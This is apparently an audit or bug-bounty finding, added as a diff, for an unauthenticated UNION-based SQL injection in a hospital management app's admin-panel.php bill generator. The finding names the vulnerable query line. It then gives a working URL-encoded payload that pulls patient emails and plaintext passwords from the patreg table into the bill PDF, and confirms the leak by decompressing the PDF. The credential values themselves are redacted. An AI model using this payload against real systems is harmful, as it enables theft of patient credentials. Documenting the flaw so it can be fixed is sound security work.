@@ -1,0 +1,20 @@
+HMS-02: Unauthenticated UNION-based SELECT SQLi exfiltrating patreg credentials via bill PDF
+Sink: admin-panel.php:86  generate_bill(): "select p.pid,...,a.docFees from prestb p inner join
+      appointmenttb a on p.ID=a.ID and p.pid = '$pid' and p.ID = '".$_GET['ID']."'"
+Output channel: rows rendered into TCPDF bill (GET generate_bill=1), Output("bill.pdf",'I').
+11 result columns; payload placed in ID position; $_SESSION['pid'] empty string when unauth.
+
+    baseline: GET /admin-panel.php?ID=1&generate_bill=1
+              -> HTTP 200, 7022 bytes PDF
+    payload:  GET /admin-panel.php?ID=9999%27%20UNION%20SELECT%201%2Cemail%2Cpassword%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20FROM%20patreg--%20-&generate_bill=1
+              (decodes to: 9999' UNION SELECT 1,email,password,4,5,6,7,8,9,10,11 FROM patreg-- -)
+              -> HTTP 200, 11844 bytes PDF
+
+    TCPDF compresses content streams (FlateDecode); after zlib-decompressing the payload PDF:
+      '<REDACTED>'            -> present   (patreg row 1 email, pid=1; 9-char email-format string)
+      '<REDACTED>'               -> present   (patreg row 1 PLAINTEXT password; 6 chars, alphanumeric)
+      '<REDACTED>'                               -> present   (email-format credential, 10 chars)
+      '<REDACTED>'                               -> present   (plaintext password credential, 12 chars, alphanumeric)
+      '<REDACTED>'                               -> present   (plaintext password credential, 8 chars, lowercase letters)
+    Same decompression of the baseline PDF: <REDACTED> absent, <REDACTED> absent (no credential strings in the baseline bill).
+    => all 11 patreg rows (email+password in adjacent columns) injected into the bill PDF.
